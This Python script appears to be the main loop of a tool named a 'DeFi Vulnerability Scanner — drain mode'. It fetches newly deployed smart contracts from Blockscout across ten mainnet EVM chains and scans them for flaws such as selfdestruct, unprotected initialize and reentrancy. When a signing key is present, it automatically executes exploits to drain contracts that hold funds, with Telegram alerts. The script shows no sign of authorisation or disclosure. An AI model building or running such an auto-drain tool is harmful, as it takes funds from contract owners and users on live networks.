#!/usr/bin/env python3
"""DeFi Vulnerability Scanner — drain mode.

Fetches recent contracts from Blockscout on all EVM chains,
scans for drain vulnerabilities, and notifies via Telegram
only when: CRITICAL finding + ETH balance > 0 + exploit plan.

Usage:
    uv run python run_drain_scanner.py
"""
import logging
import os
import sys
import tomllib
from typing import Optional
from src.db.queue import TokenQueue, ContractQueue
from src.data import DataCollector
from src.rpc import RpcClient
from src.explorer import ExplorerClient
from src.scanners.evm_scanner import EvmScanner
from src.reporter.json_report import JsonReporter
from src.analyzer import Analyzer
from src.types import Chain
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.notifier.telegram import TelegramNotifier
from src.exploit_executor import ExploitExecutor

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
)
logger = logging.getLogger("drain-scanner")

CHAIN_MAP: dict[str, Chain] = {
    "ethereum": Chain.ETHEREUM, "bsc": Chain.BSC, "arbitrum": Chain.ARBITRUM,
    "base": Chain.BASE, "polygon": Chain.POLYGON, "avalanche": Chain.AVALANCHE,
    "optimism": Chain.OPTIMISM, "zksync": Chain.ZKSYNC, "linea": Chain.LINEA,
    "scroll": Chain.SCROLL,
}

EVM_CHAINS = ["ethereum", "bsc", "base", "arbitrum", "polygon", "avalanche",
              "optimism", "zksync", "linea", "scroll"]


def load_config() -> dict:
    with open("config.toml", "rb") as f:
        return tomllib.load(f)


def build_scanner(rpc_url: str, chain: Chain, executor: Optional[ExploitExecutor] = None) -> EvmScanner:
    rpc = RpcClient(rpc_url)
    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    return EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner, executor=executor)


def main():
    config = load_config()
    rpc_cfg = config["rpc"]
    db_path = config["analyzer"]["db_path"]

    telegram_cfg = config.get("telegram", {})
    bot_token = telegram_cfg.get("bot_token", "")
    chat_id = telegram_cfg.get("chat_id", "")
    telegram = TelegramNotifier(bot_token, chat_id) if bot_token and chat_id else None
    if telegram:
        logger.info("Telegram notifier enabled")
    else:
        logger.warning("No Telegram config — alerts will be logged only")

    from src.signer import load_evm_private_key
    signer = load_evm_private_key()
    executor = ExploitExecutor(signer, telegram=telegram) if signer else None
    if executor:
        logger.info("ExploitExecutor ready — will auto-drain findings")
    else:
        logger.info("No signer — scan only (no auto-drain)")

    queue = TokenQueue(db_path=db_path)
    queue.init_db()

    # Clean old failed contract targets so fresh scan starts clean
    try:
        import sqlite3
        db = sqlite3.connect(db_path)
        db.execute("DELETE FROM contract_targets WHERE status='failed'")
        db.commit()
        db.close()
        logger.info("Cleaned old failed contract targets")
    except Exception:
        pass

    scanners: dict[Chain, EvmScanner] = {}
    for chain_name in EVM_CHAINS:
        chain = CHAIN_MAP[chain_name]
        rpc_url = rpc_cfg.get(chain_name, "")
        if not rpc_url:
            logger.warning("No RPC for %s, skipping", chain_name)
            continue
        scanners[chain] = build_scanner(rpc_url, chain, executor=executor)
        logger.info("Scanner ready: %s", chain_name)

    reporter = JsonReporter(output_dir=config["analyzer"]["reports_dir"])

    analyzer = Analyzer(
        queue=queue,
        scanners=scanners,
        reporter=reporter,
        max_workers=int(os.environ.get("SCAN_WORKERS", "2")),
        telegram_notifier=telegram,
    )

    logger.info("DeFi drain scanner started — scanning all EVM chains via Blockscout")
    logger.info("Watching for: selfdestruct, ownership_transfer, withdraw, initialize, cross_contract_reentrancy")
    if executor:
        logger.info("🟢 Auto-drain ENABLED")
    else:
        logger.info("🔴 No private key — scan only, no drain")

    # Live loop: fetches Blockscout contracts, scans, drains
    analyzer.run(interval=2.0)


if __name__ == "__main__":
    main()
